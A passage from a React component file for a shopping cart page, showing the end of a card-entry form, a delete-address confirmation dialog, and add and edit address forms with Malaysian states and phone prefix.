											onFocus={handleFocusInputCardCvc}
											placeholder="CVV"
											type="text" />
										</div>
									</div>
								</div>
								{isValidCardMonthData ? <p className="card-main-error-text">{cardErrorDataText}</p> : null}
								{isValidCardInputCard ? <p className="card-main-error-text">{cardErrorDataTextInput}</p> : null}
								<button onClick={sendDataCard}
								className="credit-card-wrapper-container-main-footer-button">Add card</button>



								
							</div>


						</div>
					</div>


				</div>

				<div className="confirm-to-delete-address" style={{display: showDeleteAdress}}>
					<div className="confirm-to-delete-address-wrapper">
					<div style={{maxHeight: 'inherit'}}>
						<div className="confirm-to-delete-address-container">
						<div className="confirm-to-delete-address-container-header">
							<p>Delete this address?</p>
							<button onClick={handleShowDeleteAdressNone}>
							<svg className="" fill="#57585a" fillRule="nonzero" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><title>Close Icon</title><path d="M13.414 12l5.293 5.293a1 1 0 0 1-1.414 1.414L12 13.414l-5.293 5.293a1 1 0 1 1-1.414-1.414L10.586 12 5.293 6.707a1 1 0 0 1 1.414-1.414L12 10.586l5.293-5.293a1 1 0 0 1 1.414 1.414L13.414 12z"></path></svg>
							</button>
						</div>
						<div style={{textAlign: 'left'}}>
							<p>This cannot be undone</p>
						</div>
						<div style={{marginTop: '24px', textAlign: 'right'}}>
							<button className="confirm-to-delete-address-container-header-button-cancel" onClick={handleShowDeleteAdressNone}>Cancel</button>
							<button className="confirm-to-delete-address-container-header-button-delete" onClick={handleDeleteData}>Delete</button>
						</div>
						</div>
					</div>
					</div>
				</div>
				{/* { buttonEditDataState === true ? */}
				{/* <div className="add-new-address-info" style={{display: addressVisiblity}}>
					<div className="add-new-address-info-wrapper">
						<div className="add-new-address-info-wrapper-visibility" style={{display: 'visible', maxHeight: 'inherit'}}>
							<div className="add-new-address-info-wrapper-container">
								<div className="add-new-address-info-wrapper-container-header">
									<h2>Add new address</h2>
									<button onClick={() => setAddressVisibility('none')}>
										<svg className="" fill="#57585a" fillRule="nonzero" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><title>Close Icon</title><path d="M13.414 12l5.293 5.293a1 1 0 0 1-1.414 1.414L12 13.414l-5.293 5.293a1 1 0 1 1-1.414-1.414L10.586 12 5.293 6.707a1 1 0 0 1 1.414-1.414L12 10.586l5.293-5.293a1 1 0 0 1 1.414 1.414L13.414 12z"></path></svg>
									</button>

								</div>
								<form onSubmit={handleSubmit} className="add-new-address-info-wrapper-container-main-form">
									<div className="add-new-address-info-wrapper-container-main-form-info">
										<div className="add-new-address-recipient-name">
											<input value={editData.recipientName} onChange={(event) => setAddressRecipientName(event.target.value)} className="recipient-name" type="text" required="required" 
											placeholder={yourName} onFocus={() => setYourName('Your name')} onBlur={() => setYourName('')}/>
											<span>Recipient's name</span>
										</div>
									</div>
									<div className="add-new-address-info-wrapper-container-main-form-info">
										<div className="add-new-address-recipient-phone-number" style={{display: 'flex'}}>
											<div className="add-new-address-recipient-phone-number-code">
												<h2>🇲🇾 +60</h2>
											</div>
												<div className="add-new-address-recipient-phone">
													<input pattern="[0-9]*" value={editData.phoneNumber} onChange={handlePhoneNumber} className="recipient-name" type="text" required="required" style={{borderBottomLeftRadius: '0', borderTopLeftRadius: '0'}}
													placeholder={yourPhone} onFocus={() => setYourPhone('Enter your phone number')} onBlur={() => setYourPhone('')}/>
													<span>Phone number</span>
												</div>
										</div>
										{error ? <p className="add-new-address-info-text-under-phone-not-valid">{error}</p> : <p className="add-new-address-info-text-under-phone">Receive order update notifications</p>}
									</div>
									<div className="add-new-address-info-wrapper-container-main-form-info">
										<div className="add-new-address-recipient-name">
											<input pattern="[0-9]*" value={editData.postcode}  onChange={(e) => setEditData((v) => (e.target.validity.valid ? e.target.value : v))} className="recipient-name" type="text" required="required" 
											placeholder={yourPostcode} onFocus={() => setYourPostcode('E.g 80050')} onBlur={() => setYourPostcode('')}/>
											<span>Postcode</span>
										</div>
										{!isValid ? <h2 className="add-new-address-info-text-postcode">{errorPostcode}</h2> : null}
									</div>
									<div className="add-new-address-info-wrapper-container-main-form-info">
										<div className="add-new-address-recipient-name">
											<input value={editData.street} onChange={(event) => setEditData(event.target.value)} className="recipient-name" type="text" required="required" 
											placeholder={yourStreet} onFocus={() => setYourStreet('E.g, 15, Jalan Badik 2, Taman Sri Tebrau')} onBlur={() => setYourStreet('')}/>
											<span>Street and unit</span>
										</div>
									</div>
									<div className="add-new-address-info-wrapper-container-main-form-info">
										<div className="add-new-address-recipient-name">
											<input value={editData.city} onChange={(event) => setEditData(event.target.value)} className="recipient-name" type="text" required="required" 
											placeholder={yourCity} onFocus={() => setYourCity('E.g, Johor Bahru, Kuala Lumpur, Penang, Meleka')} onBlur={() => setYourCity('')}/>
											<span>City</span>
										</div>
									</div>
									<div className="add-new-address-info-wrapper-container-select" 
									style={{marginBottom: '16px', display: 'flex', flexFlow: 'column nowrap'}}>
										<select value={editData.selectState} onChange={(event) => setAddressSelectState(event.target.value)} className="add-new-address-info-wrapper-container-select-selector">
											<option value="">Select your state</option>
											<option value="Johor">Johor</option>
											<option value="Kedah">Kedah</option>
											<option value="Kelantan">Kelantan</option>
											<option value="Kuala Lumpur">Kuala Lumpur</option>
											<option value="Labuan">Labuan</option>
											<option value="Melaka">Melaka</option>
											<option value="Negeri Sembilan">Negeri Sembilan</option>
											<option value="Pahang">Pahang</option>
											<option value="Penang">Penang</option>
											<option value="Perak">Perak</option>
											<option value="Perlis">Perlis</option>
											<option value="Sabah">Sabah</option>
											<option value="Sarawak">Sarawak</option>
											<option value="Selangor">Selangor</option>
											<option value="Terengganu">Terengganu</option>
										</select>
									</div>
									<p className="add-new-address-info-wrapper-container-select-text-under">Your address and phone number will be shown to your seller for delivery.</p>
									<div className="add-new-address-info-wrapper-buttons" style={{textAlign: 'right'}}>
									<button onClick={() => setAddressVisibility('')} className="add-new-address-info-wrapper-buttons-cancel">Cancel</button>
									<button onClick={() => handleEditButton()} className="add-new-address-info-wrapper-buttons-add-address">Edit this address</button>
									
										
									
									</div>
								</form>


							</div>
						</div>

					</div>


				</div>  */}
				{/* : */}
				<div className="add-new-address-info" style={{display: addressVisiblity}}>
					<div className="add-new-address-info-wrapper">
						<div className="add-new-address-info-wrapper-visibility" style={{display: 'visible', maxHeight: 'inherit'}}>
							<div className="add-new-address-info-wrapper-container">
								<div className="add-new-address-info-wrapper-container-header">
									<h2>Add new address</h2>
									<button onClick={() => setAddressVisibility('none')}>
										<svg className="" fill="#57585a" fillRule="nonzero" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><title>Close Icon</title><path d="M13.414 12l5.293 5.293a1 1 0 0 1-1.414 1.414L12 13.414l-5.293 5.293a1 1 0 1 1-1.414-1.414L10.586 12 5.293 6.707a1 1 0 0 1 1.414-1.414L12 10.586l5.293-5.293a1 1 0 0 1 1.414 1.414L13.414 12z"></path></svg>
									</button>

								</div>
								<form onSubmit={handleSubmit} className="add-new-address-info-wrapper-container-main-form">
									<div className="add-new-address-info-wrapper-container-main-form-info">
										<div className="add-new-address-recipient-name">
											<input value={addressRecipientName} onChange={(event) => setAddressRecipientName(event.target.value)} className="recipient-name" type="text" required="required" 
											placeholder={yourName} onFocus={() => setYourName('Your name')} onBlur={() => setYourName('')}/>
											<span>Recipient's name</span>
										</div>
									</div>
									<div className="add-new-address-info-wrapper-container-main-form-info">
										<div className="add-new-address-recipient-phone-number" style={{display: 'flex'}}>
											<div className="add-new-address-recipient-phone-number-code">
												<h2>🇲🇾 +60</h2>
											</div>
												<div className="add-new-address-recipient-phone">
													<input pattern="[0-9]*" value={addressPhoneNumber} onChange={handlePhoneNumber} className="recipient-name" type="text" required="required" style={{borderBottomLeftRadius: '0', borderTopLeftRadius: '0'}}
													placeholder={yourPhone} onFocus={() => setYourPhone('Enter your phone number')} onBlur={() => setYourPhone('')}/>
													<span>Phone number</span>
												</div>
										</div>
										{error ? <p className="add-new-address-info-text-under-phone-not-valid">{error}</p> : <p className="add-new-address-info-text-under-phone">Receive order update notifications</p>}
									</div>
									<div className="add-new-address-info-wrapper-container-main-form-info">
										<div className="add-new-address-recipient-name">
											<input pattern="[0-9]*" value={addressPostcode}  onChange={(e) => setAddressPostcode((v) => (e.target.validity.valid ? e.target.value : v))} className="recipient-name" type="text" required="required" 
											placeholder={yourPostcode} onFocus={() => setYourPostcode('E.g 80050')} onBlur={() => setYourPostcode('')}/>
											<span>Postcode</span>
										</div>
										{!isValid ? <h2 className="add-new-address-info-text-postcode">{errorPostcode}</h2> : null}
									</div>
									<div className="add-new-address-info-wrapper-container-main-form-info">
										<div className="add-new-address-recipient-name">
											<input value={addressStreet} onChange={(event) => setAddressStreet(event.target.value)} className="recipient-name" type="text" required="required" 
											placeholder={yourStreet} onFocus={() => setYourStreet('E.g, 15, Jalan Badik 2, Taman Sri Tebrau')} onBlur={() => setYourStreet('')}/>
											<span>Street and unit</span>
										</div>
									</div>
									<div className="add-new-address-info-wrapper-container-main-form-info">
										<div className="add-new-address-recipient-name">
											<input value={addressCity} onChange={(event) => setAddressCity(event.target.value)} className="recipient-name" type="text" required="required" 
											placeholder={yourCity} onFocus={() => setYourCity('E.g, Johor Bahru, Kuala Lumpur, Penang, Meleka')} onBlur={() => setYourCity('')}/>
											<span>City</span>
										</div>
									</div>
									<div className="add-new-address-info-wrapper-container-select" 
									style={{marginBottom: '16px', display: 'flex', flexFlow: 'column nowrap'}}>
										<select value={addressSelectState} onChange={(event) => setAddressSelectState(event.target.value)} className="add-new-address-info-wrapper-container-select-selector">
											<option value="">Select your state</option>
											<option value="Johor">Johor</option>
											<option value="Kedah">Kedah</option>
											<option value="Kelantan">Kelantan</option>
											<option value="Kuala Lumpur">Kuala Lumpur</option>
											<option value="Labuan">Labuan</option>
											<option value="Melaka">Melaka</option>
											<option value="Negeri Sembilan">Negeri Sembilan</option>
											<option value="Pahang">Pahang</option>
											<option value="Penang">Penang</option>
											<option value="Perak">Perak</option>
											<option value="Perlis">Perlis</option>
											<option value="Sabah">Sabah</option>
											<option value="Sarawak">Sarawak</option>
											<option value="Selangor">Selangor</option>
											<option value="Terengganu">Terengganu</option>
										</select>
									</div>
									<p className="add-new-address-info-wrapper-container-select-text-under">Your address and phone number will be shown to your seller for delivery.</p>
									<div className="add-new-address-info-wrapper-buttons" style={{textAlign: 'right'}}>
									<button onClick={() => setAddressVisibility('none')} className="add-new-address-info-wrapper-buttons-cancel">Cancel</button>
									<button onClick={sendDataAddress} className="add-new-address-info-wrapper-buttons-add-address">Add this address</button>
									</div>
								</form>
							</div>
						</div>
					</div>
				</div>
				{/* } */}
				</>
			}
			</>
		</Container>
	);
}

export default Cart;